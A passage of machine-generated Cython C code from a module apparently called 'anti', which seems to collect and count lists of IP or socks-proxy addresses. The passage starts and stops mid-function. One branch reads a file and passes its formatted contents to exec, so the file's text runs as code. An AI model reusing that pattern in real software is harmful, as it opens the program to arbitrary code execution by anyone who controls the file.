                            if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 245, __pyx_L67_except_error)
                                __Pyx_GOTREF(__pyx_t_16);
                            __pyx_t_2 = __Pyx_PyObject_IsTrue(__pyx_t_16);
                            __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
                            if (__pyx_t_2 < 0) __PYX_ERR(0, 245, __pyx_L67_except_error)
                                __pyx_t_13 = ((!(__pyx_t_2 != 0)) != 0);
                            if (__pyx_t_13) {
                                __Pyx_GIVEREF(__pyx_t_3);
                                __Pyx_GIVEREF(__pyx_t_1);
                                __Pyx_XGIVEREF(__pyx_t_4);
                                __Pyx_ErrRestoreWithState(__pyx_t_3, __pyx_t_1, __pyx_t_4);
                                __pyx_t_3 = 0; __pyx_t_1 = 0; __pyx_t_4 = 0;
                                __PYX_ERR(0, 245, __pyx_L67_except_error)
                            }
                            __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
                            __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
                            __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
                            goto __pyx_L66_exception_handled;
                        }
                    __pyx_L67_except_error:;
                        __Pyx_XGIVEREF(__pyx_t_7);
                        __Pyx_XGIVEREF(__pyx_t_8);
                        __Pyx_XGIVEREF(__pyx_t_15);
                        __Pyx_ExceptionReset(__pyx_t_7, __pyx_t_8, __pyx_t_15);
                        goto __pyx_L1_error;
                    __pyx_L66_exception_handled:;
                        __Pyx_XGIVEREF(__pyx_t_7);
                        __Pyx_XGIVEREF(__pyx_t_8);
                        __Pyx_XGIVEREF(__pyx_t_15);
                        __Pyx_ExceptionReset(__pyx_t_7, __pyx_t_8, __pyx_t_15);
                    __pyx_L70_try_end:;
                    }
                } { {
                        if (__pyx_t_6) {
                            __pyx_t_15 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_tuple__6, NULL);
                            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
                            if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 245, __pyx_L1_error)
                                __Pyx_GOTREF(__pyx_t_15);
                            __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
                        }
                        goto __pyx_L64;
                    }
                __pyx_L64:;
                }
                goto __pyx_L83;
            __pyx_L61_error:;
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
                goto __pyx_L1_error;
            __pyx_L83:;
            }
            __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_block); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 247, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_4);
            if (likely(PyList_CheckExact(__pyx_t_4)) || PyTuple_CheckExact(__pyx_t_4)) {
                __pyx_t_1 = __pyx_t_4; __Pyx_INCREF(__pyx_t_1); __pyx_t_14 = 0;
                __pyx_t_10 = NULL;
            }
            else {
                __pyx_t_14 = -1; __pyx_t_1 = PyObject_GetIter(__pyx_t_4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 247, __pyx_L1_error)
                    __Pyx_GOTREF(__pyx_t_1);
                __pyx_t_10 = Py_TYPE(__pyx_t_1)->tp_iternext; if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 247, __pyx_L1_error)
            }
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            for (;;) {
                if (likely(!__pyx_t_10)) {
                    if (likely(PyList_CheckExact(__pyx_t_1))) {
                        if (__pyx_t_14 >= PyList_GET_SIZE(__pyx_t_1)) break;
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                        __pyx_t_4 = PyList_GET_ITEM(__pyx_t_1, __pyx_t_14); __Pyx_INCREF(__pyx_t_4); __pyx_t_14++; if (unlikely(0 < 0)) __PYX_ERR(0, 247, __pyx_L1_error)
#else
                        __pyx_t_4 = PySequence_ITEM(__pyx_t_1, __pyx_t_14); __pyx_t_14++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 247, __pyx_L1_error)
                            __Pyx_GOTREF(__pyx_t_4);
#endif
                    }
                    else {
                        if (__pyx_t_14 >= PyTuple_GET_SIZE(__pyx_t_1)) break;
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                        __pyx_t_4 = PyTuple_GET_ITEM(__pyx_t_1, __pyx_t_14); __Pyx_INCREF(__pyx_t_4); __pyx_t_14++; if (unlikely(0 < 0)) __PYX_ERR(0, 247, __pyx_L1_error)
#else
                        __pyx_t_4 = PySequence_ITEM(__pyx_t_1, __pyx_t_14); __pyx_t_14++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 247, __pyx_L1_error)
                            __Pyx_GOTREF(__pyx_t_4);
#endif
                    }
                }
                else {
                    __pyx_t_4 = __pyx_t_10(__pyx_t_1);
                    if (unlikely(!__pyx_t_4)) {
                        PyObject* exc_type = PyErr_Occurred();
                        if (exc_type) {
                            if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                            else __PYX_ERR(0, 247, __pyx_L1_error)
                        }
                        break;
                    }
                    __Pyx_GOTREF(__pyx_t_4);
                }
                if (PyDict_SetItem(__pyx_d, __pyx_n_s_i, __pyx_t_4) < 0) __PYX_ERR(0, 247, __pyx_L1_error)
                    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_list_ban_ip); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 248, __pyx_L1_error)
                    __Pyx_GOTREF(__pyx_t_4);
                __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_kp_u_0_2, __pyx_n_s_format); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 248, __pyx_L1_error)
                    __Pyx_GOTREF(__pyx_t_5);
                __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_i); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 248, __pyx_L1_error)
                    __Pyx_GOTREF(__pyx_t_11);
                __pyx_t_17 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_t_11); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 248, __pyx_L1_error)
                    __Pyx_GOTREF(__pyx_t_17);
                __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
                __pyx_t_11 = NULL;
                if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
                    __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_5);
                    if (likely(__pyx_t_11)) {
                        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
                        __Pyx_INCREF(__pyx_t_11);
                        __Pyx_INCREF(function);
                        __Pyx_DECREF_SET(__pyx_t_5, function);
                    }
                }
                __pyx_t_3 = (__pyx_t_11) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_11, __pyx_t_17) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_17);
                __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
                __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
                if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 248, __pyx_L1_error)
                    __Pyx_GOTREF(__pyx_t_3);
                __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                __pyx_t_5 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_t_3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 248, __pyx_L1_error)
                    __Pyx_GOTREF(__pyx_t_5);
                __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                __pyx_t_3 = PyNumber_InPlaceAdd(__pyx_t_4, __pyx_t_5); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 248, __pyx_L1_error)
                    __Pyx_GOTREF(__pyx_t_3);
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                if (PyDict_SetItem(__pyx_d, __pyx_n_s_list_ban_ip, __pyx_t_3) < 0) __PYX_ERR(0, 248, __pyx_L1_error)
                    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            }
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_is_get_sock); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 249, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_1);
            __pyx_t_3 = __Pyx_PyNumber_Int(__pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 249, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_3);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __pyx_t_1 = __Pyx_PyInt_EqObjC(__pyx_t_3, __pyx_int_1, 1, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 249, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __pyx_t_13 = __Pyx_PyObject_IsTrue(__pyx_t_1); if (unlikely(__pyx_t_13 < 0)) __PYX_ERR(0, 249, __pyx_L1_error)
                __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            if (__pyx_t_13) {
                {
                    __Pyx_PyThreadState_declare
                        __Pyx_PyThreadState_assign
                        __Pyx_ExceptionSave(&__pyx_t_6, &__pyx_t_15, &__pyx_t_8);
                    __Pyx_XGOTREF(__pyx_t_6);
                    __Pyx_XGOTREF(__pyx_t_15);
                    __Pyx_XGOTREF(__pyx_t_8); { {
                            __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__58, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 251, __pyx_L87_error)
                                __Pyx_GOTREF(__pyx_t_1);
                            __pyx_t_7 = __Pyx_PyObject_LookupSpecial(__pyx_t_1, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 251, __pyx_L87_error)
                                __Pyx_GOTREF(__pyx_t_7);
                            __pyx_t_3 = __Pyx_PyObject_LookupSpecial(__pyx_t_1, __pyx_n_s_enter); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 251, __pyx_L93_error)
                                __Pyx_GOTREF(__pyx_t_3);
                            __pyx_t_5 = __Pyx_PyObject_CallNoArg(__pyx_t_3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 251, __pyx_L93_error)
                                __Pyx_GOTREF(__pyx_t_5);
                            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                            __pyx_t_3 = __pyx_t_5;
                            __pyx_t_5 = 0;
                            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0; {
                                {
                                    __Pyx_PyThreadState_declare
                                        __Pyx_PyThreadState_assign
                                        __Pyx_ExceptionSave(&__pyx_t_16, &__pyx_t_18, &__pyx_t_19);
                                    __Pyx_XGOTREF(__pyx_t_16);
                                    __Pyx_XGOTREF(__pyx_t_18);
                                    __Pyx_XGOTREF(__pyx_t_19); {
                                        if (PyDict_SetItem(__pyx_d, __pyx_n_s_f, __pyx_t_3) < 0) __PYX_ERR(0, 251, __pyx_L97_error)
                                            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                                        while (1) {
                                            __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__59, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 253, __pyx_L97_error)
                                                __Pyx_GOTREF(__pyx_t_3);
                                            __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 253, __pyx_L97_error)
                                                __Pyx_GOTREF(__pyx_t_1);
                                            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                                            if (PyDict_SetItem(__pyx_d, __pyx_n_s_khanh, __pyx_t_1) < 0) __PYX_ERR(0, 253, __pyx_L97_error)
                                                __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                                            __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_khanh); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 254, __pyx_L97_error)
                                                __Pyx_GOTREF(__pyx_t_1);
                                            __pyx_t_2 = (__Pyx_PyUnicode_Equals(__pyx_t_1, __pyx_n_u_Y, Py_EQ)); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 254, __pyx_L97_error)
                                                __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                                            if (!__pyx_t_2) {
                                            }
                                            else {
                                                __pyx_t_13 = __pyx_t_2;
                                                goto __pyx_L106_bool_binop_done;
                                            }
                                            __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_khanh); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 254, __pyx_L97_error)
                                                __Pyx_GOTREF(__pyx_t_1);
                                            __pyx_t_2 = (__Pyx_PyUnicode_Equals(__pyx_t_1, __pyx_n_u_y, Py_EQ)); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 254, __pyx_L97_error)
                                                __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                                            __pyx_t_13 = __pyx_t_2;
                                        __pyx_L106_bool_binop_done:;
                                            if (__pyx_t_13) {
                                                __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_kp_u_global_blockk, __pyx_n_s_format); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 255, __pyx_L97_error)
                                                    __Pyx_GOTREF(__pyx_t_3);
                                                __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_f); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 255, __pyx_L97_error)
                                                    __Pyx_GOTREF(__pyx_t_4);
                                                __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_read); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 255, __pyx_L97_error)
                                                    __Pyx_GOTREF(__pyx_t_17);
                                                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                                                __pyx_t_4 = NULL;
                                                if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_17))) {
                                                    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_17);
                                                    if (likely(__pyx_t_4)) {
                                                        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_17);
                                                        __Pyx_INCREF(__pyx_t_4);
                                                        __Pyx_INCREF(function);
                                                        __Pyx_DECREF_SET(__pyx_t_17, function);
                                                    }
                                                }
                                                __pyx_t_5 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_17, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_17);
                                                __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
                                                if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 255, __pyx_L97_error)
                                                    __Pyx_GOTREF(__pyx_t_5);
                                                __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
                                                __pyx_t_17 = NULL;
                                                if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
                                                    __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_3);
                                                    if (likely(__pyx_t_17)) {
                                                        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
                                                        __Pyx_INCREF(__pyx_t_17);
                                                        __Pyx_INCREF(function);
                                                        __Pyx_DECREF_SET(__pyx_t_3, function);
                                                    }
                                                }
                                                __pyx_t_1 = (__pyx_t_17) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_17, __pyx_t_5) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_5);
                                                __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
                                                __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                                                if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 255, __pyx_L97_error)
                                                    __Pyx_GOTREF(__pyx_t_1);
                                                __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                                                __pyx_t_3 = __Pyx_PyExecGlobals(__pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 255, __pyx_L97_error)
                                                    __Pyx_GOTREF(__pyx_t_3);
                                                __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                                                __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                                                __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_kp_u_Total_IP_Sock_IP, __pyx_n_s_format); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 256, __pyx_L97_error)
                                                    __Pyx_GOTREF(__pyx_t_1);
                                                __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_blockk); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 256, __pyx_L97_error)
                                                    __Pyx_GOTREF(__pyx_t_5);
                                                __pyx_t_14 = PyObject_Length(__pyx_t_5); if (unlikely(__pyx_t_14 == ((Py_ssize_t)-1))) __PYX_ERR(0, 256, __pyx_L97_error)
                                                    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                                                __pyx_t_5 = PyInt_FromSsize_t(__pyx_t_14); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 256, __pyx_L97_error)
                                                    __Pyx_GOTREF(__pyx_t_5);
                                                __pyx_t_17 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_t_5); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 256, __pyx_L97_error)
                                                    __Pyx_GOTREF(__pyx_t_17);
                                                __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                                                __pyx_t_5 = NULL;
                                                if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
                                                    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_1);
                                                    if (likely(__pyx_t_5)) {
                                                        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
                                                        __Pyx_INCREF(__pyx_t_5);
                                                        __Pyx_INCREF(function);
                                                        __Pyx_DECREF_SET(__pyx_t_1, function);
                                                    }
                                                }
                                                __pyx_t_3 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_1, __pyx_t_5, __pyx_t_17) : __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_17);
                                                __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
                                                __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
                                                if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 256, __pyx_L97_error)
                                                    __Pyx_GOTREF(__pyx_t_3);
                                                __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                                                __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 256, __pyx_L97_error)
                                                    __Pyx_GOTREF(__pyx_t_1);
                                                __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                                                __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                                                __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_kp_u_Real_IP_Sock_IP, __pyx_n_s_format); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 257, __pyx_L97_error)
                                                    __Pyx_GOTREF(__pyx_t_3);
                                                __Pyx_GetModuleGlobalName(__pyx_t_17, __pyx_n_s_blockk); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 257, __pyx_L97_error)
                                                    __Pyx_GOTREF(__pyx_t_17);
                                                __pyx_t_5 = PySet_New(__pyx_t_17); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 257, __pyx_L97_error)
                                                    __Pyx_GOTREF(__pyx_t_5);
                                                __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
                                                __pyx_t_17 = PySequence_List(__pyx_t_5); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 257, __pyx_L97_error)
                                                    __Pyx_GOTREF(__pyx_t_17);
                                                __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                                                __pyx_t_14 = PyList_GET_SIZE(__pyx_t_17); if (unlikely(__pyx_t_14 == ((Py_ssize_t)-1))) __PYX_ERR(0, 257, __pyx_L97_error)
                                                    __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
                                                __pyx_t_17 = PyInt_FromSsize_t(__pyx_t_14); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 257, __pyx_L97_error)
                                                    __Pyx_GOTREF(__pyx_t_17);
                                                __pyx_t_5 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_t_17); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 257, __pyx_L97_error)
                                                    __Pyx_GOTREF(__pyx_t_5);
                                                __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
                                                __pyx_t_17 = NULL;
                                                if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
                                                    __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_3);
                                                    if (likely(__pyx_t_17)) {
                                                        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
                                                        __Pyx_INCREF(__pyx_t_17);
                                                        __Pyx_INCREF(function);
                                                        __Pyx_DECREF_SET(__pyx_t_3, function);
                                                    }
                                                }
                                                __pyx_t_1 = (__pyx_t_17) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_17, __pyx_t_5) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_5);
                                                __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
                                                __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                                                if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 257, __pyx_L97_error)
                                                    __Pyx_GOTREF(__pyx_t_1);
                                                __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                                                __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 257, __pyx_L97_error)
                                                    __Pyx_GOTREF(__pyx_t_3);
                                                __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                                                __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                                                __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__60, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 258, __pyx_L97_error)
                                                    __Pyx_GOTREF(__pyx_t_3);
                                                __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                                                goto __pyx_L104_break;
                                            }
                                            __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_khanh); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 260, __pyx_L97_error)
                                                __Pyx_GOTREF(__pyx_t_3);
                                            __pyx_t_2 = (__Pyx_PyUnicode_Equals(__pyx_t_3, __pyx_n_u_N, Py_EQ)); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 260, __pyx_L97_error)
                                                __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                                            if (!__pyx_t_2) {
                                            }
                                            else {
                                                __pyx_t_13 = __pyx_t_2;
                                                goto __pyx_L108_bool_binop_done;
                                            }
                                            __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_khanh); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 260, __pyx_L97_error)
                                                __Pyx_GOTREF(__pyx_t_3);
                                            __pyx_t_2 = (__Pyx_PyUnicode_Equals(__pyx_t_3, __pyx_n_u_n, Py_EQ)); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 260, __pyx_L97_error)
                                                __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                                            __pyx_t_13 = __pyx_t_2;
                                        __pyx_L108_bool_binop_done:;
                                            if (__pyx_t_13) {
                                                __pyx_t_3 = __Pyx_PyObject_CallNoArg(__pyx_builtin_print); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 261, __pyx_L97_error)
                                                    __Pyx_GOTREF(__pyx_t_3);
                                                __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                                                __pyx_t_3 = __Pyx_PyNumber_Int(__pyx_n_u_KhanhNguyen9872); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 262, __pyx_L97_error)
                                                    __Pyx_GOTREF(__pyx_t_3);
                                                if (PyDict_SetItem(__pyx_d, __pyx_n_s__38, __pyx_t_3) < 0) __PYX_ERR(0, 262, __pyx_L97_error)
                                                    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                                                goto __pyx_L104_break;
                                            }
                                        }
                                    __pyx_L104_break:;
                                    }
                                    __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
                                    __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
                                    __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
                                    goto __pyx_L102_try_end;
                                __pyx_L97_error:;
                                    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
                                    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
                                    __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
                                    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
                                    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
                                    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0; {
                                        __Pyx_AddTraceback("anti", __pyx_clineno, __pyx_lineno, __pyx_filename);
                                        if (__Pyx_GetException(&__pyx_t_3, &__pyx_t_1, &__pyx_t_5) < 0) __PYX_ERR(0, 251, __pyx_L99_except_error)
                                            __Pyx_GOTREF(__pyx_t_3);
                                        __Pyx_GOTREF(__pyx_t_1);
                                        __Pyx_GOTREF(__pyx_t_5);
                                        __pyx_t_17 = PyTuple_Pack(3, __pyx_t_3, __pyx_t_1, __pyx_t_5); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 251, __pyx_L99_except_error)
                                            __Pyx_GOTREF(__pyx_t_17);
                                        __pyx_t_20 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_t_17, NULL);
                                        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
                                        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
                                        if (unlikely(!__pyx_t_20)) __PYX_ERR(0, 251, __pyx_L99_except_error)
                                            __Pyx_GOTREF(__pyx_t_20);
                                        __pyx_t_13 = __Pyx_PyObject_IsTrue(__pyx_t_20);
                                        __Pyx_DECREF(__pyx_t_20); __pyx_t_20 = 0;
                                        if (__pyx_t_13 < 0) __PYX_ERR(0, 251, __pyx_L99_except_error)
                                            __pyx_t_2 = ((!(__pyx_t_13 != 0)) != 0);
                                        if (__pyx_t_2) {
                                            __Pyx_GIVEREF(__pyx_t_3);
                                            __Pyx_GIVEREF(__pyx_t_1);
                                            __Pyx_XGIVEREF(__pyx_t_5);
                                            __Pyx_ErrRestoreWithState(__pyx_t_3, __pyx_t_1, __pyx_t_5);
                                            __pyx_t_3 = 0; __pyx_t_1 = 0; __pyx_t_5 = 0;
                                            __PYX_ERR(0, 251, __pyx_L99_except_error)
                                        }
                                        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
                                        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
                                        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
                                        goto __pyx_L98_exception_handled;
                                    }
                                __pyx_L99_except_error:;
                                    __Pyx_XGIVEREF(__pyx_t_16);
                                    __Pyx_XGIVEREF(__pyx_t_18);
                                    __Pyx_XGIVEREF(__pyx_t_19);
                                    __Pyx_ExceptionReset(__pyx_t_16, __pyx_t_18, __pyx_t_19);
                                    goto __pyx_L87_error;
                                __pyx_L98_exception_handled:;
                                    __Pyx_XGIVEREF(__pyx_t_16);
                                    __Pyx_XGIVEREF(__pyx_t_18);
                                    __Pyx_XGIVEREF(__pyx_t_19);
                                    __Pyx_ExceptionReset(__pyx_t_16, __pyx_t_18, __pyx_t_19);
                                __pyx_L102_try_end:;
                                }
                            } { {
                                    if (__pyx_t_7) {
                                        __pyx_t_19 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_tuple__6, NULL);
                                        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
                                        if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 251, __pyx_L87_error)
                                            __Pyx_GOTREF(__pyx_t_19);
                                        __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
                                    }
                                    goto __pyx_L96;
                                }
                            __pyx_L96:;
                            }
                            goto __pyx_L113;
                        __pyx_L93_error:;
                            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
                            goto __pyx_L87_error;
                        __pyx_L113:;
                        }
                    }
                    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
                    __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
                    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
                    goto __pyx_L92_try_end;
                __pyx_L87_error:;
                    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
                    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
                    __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
